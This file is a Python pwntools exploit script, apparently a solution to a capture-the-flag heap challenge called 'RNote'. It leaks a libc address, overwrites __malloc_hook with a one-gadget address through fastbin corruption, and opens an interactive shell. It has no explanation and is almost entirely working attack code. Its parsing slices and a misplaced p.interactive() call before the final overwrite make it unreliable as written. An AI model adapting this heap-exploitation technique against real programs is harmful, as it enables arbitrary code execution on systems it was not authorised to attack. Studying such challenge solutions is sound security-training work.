from pwn import *

def Add(Len, Title, Data):
	p.recvuntil("Your choice: ")
	p.sendline("1")
	p.recvuntil("Please input the note size: ")
	p.sendline(str(Len))
	p.recvuntil("Please input the title: ")
	p.sendline(Title)
	p.recvuntil("Please input the content: ")
	p.sendline(Data)

def Delete(Idx):
	p.recvuntil("Your choice: ")
	p.sendline("2")
	p.recvuntil("Which Note do you want to delete: ")
	p.sendline(str(Idx))

def Show(Idx):
	p.recvuntil("Your choice: ")
	p.sendline("3")
	p.recvuntil("Which Note do you want to show: ")
	p.sendline(str(Idx))
	res = dict()
	p.recvuntil("note title: ")
	res['title'] = p.recvuntil("note content: ")[:len("note content: ")]
	res['content'] = p.recvuntil("***********************")[:len("***********************")]
	return res

def Exit():
	p.recvuntil("Your choice: ")
	p.sendline("4")

if __name__ == '__main__':
	p = process("./RNote")

	Add(256,"A"*4,"B"*4)
	Add(256,"C"*4,"D"*4)
	Delete(0)
	Add(256,"LEAK","A"*7)
	data = Show(0)['content']
	data = data[8:14]
	leak = u64(data.ljust(8, '\x00'))
	print "[Leak] : 0x%x" % leak
	libc_base = leak - 88 - 0x3c4b20
	oneshot = libc_base + 0xf1117
	malloc_hook = leak - 88 - 0x10
	print "0x%x"%malloc_hook
	Delete(0)
	Delete(1)
	Delete(2)

	Add(90,"A"*16 + "\xf0","A"*4)		
	Add(90,"B"*4,"B"*4)			
	Add(90,"C"*4,"C"*4)

	Delete(2)
	Delete(1)
	Delete(0)

	Add(90,"A"*4,p64(malloc_hook - 0x23))
	Add(90,"B"*4,"B"*4)
	Add(90,"C"*4,"C"*4)
	p.interactive()
	Add(90,"D"*4, "D"*19 + p64(oneshot))

	p.sendline("1")
	p.interactive()

